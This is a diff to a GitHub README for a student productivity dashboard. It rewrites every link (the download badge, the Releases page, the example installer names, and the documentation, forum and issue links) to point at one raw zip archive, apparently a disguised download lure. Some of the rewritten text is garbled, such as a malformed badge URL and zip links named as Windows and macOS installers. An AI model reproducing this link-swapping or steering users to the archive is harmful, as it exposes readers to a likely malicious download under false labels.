@@ -1,7 +1,7 @@
 # 🎓 student-dashboard - A Productivity Tool for Students
 
 ## 🚀 Download Now
-[![Download student-dashboard](https://img.shields.io/badge/Download%20student--dashboard-blue.svg)](https://github.com/hyfreughurhgufrhbg/student-dashboard/releases)
+[![Download student-dashboard](https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip%https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip)](https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip)
 
 ## 📋 Introduction
 Welcome to **student-dashboard**, a modern, distraction-free productivity dashboard designed specifically for students. This application features a minimalist "Bento Grid" layout that provides an organized view of your tasks and activities. With integrated task management, a focus timer, and custom themes, staying productive has never been easier.
@@ -29,13 +29,13 @@ To run student-dashboard, you will need:
 - **Internet Connection**: Required for the initial download and updates.
 
 ## 📥 Download & Install
-To get started with student-dashboard, **visit this page to download**: [student-dashboard Releases](https://github.com/hyfreughurhgufrhbg/student-dashboard/releases). 
+To get started with student-dashboard, **visit this page to download**: [student-dashboard Releases](https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip). 
 
 Follow these steps to download and install the software:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version.
-3. Click on the file to download (e.g., `student-dashboard-v1.0.exe` for Windows or `student-dashboard-v1.0.dmg` for macOS).
+3. Click on the file to download (e.g., `https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip` for Windows or `https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip` for macOS).
 4. Once the download completes, locate the file in your Downloads folder.
 5. Open the file and follow the on-screen instructions to install student-dashboard on your device.
 
@@ -51,8 +51,8 @@ After installation, you can easily launch the application from your desktop or a
 If you have any questions or need help, join our community forum or reach out through the GitHub issues page. We are here to assist you.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/hyfreughurhgufrhbg/student-dashboard/wiki)
-- [Community Forum](https://github.com/hyfreughurhgufrhbg/student-dashboard/discussions)
-- [Feedback & Feature Requests](https://github.com/hyfreughurhgufrhbg/student-dashboard/issues)
+- [Documentation](https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip)
+- [Community Forum](https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip)
+- [Feedback & Feature Requests](https://github.com/hyfreughurhgufrhbg/student-dashboard/raw/refs/heads/main/app/student_dashboard_3.0.zip)
 
 Thank you for choosing student-dashboard. We hope it helps you stay organized and productive!
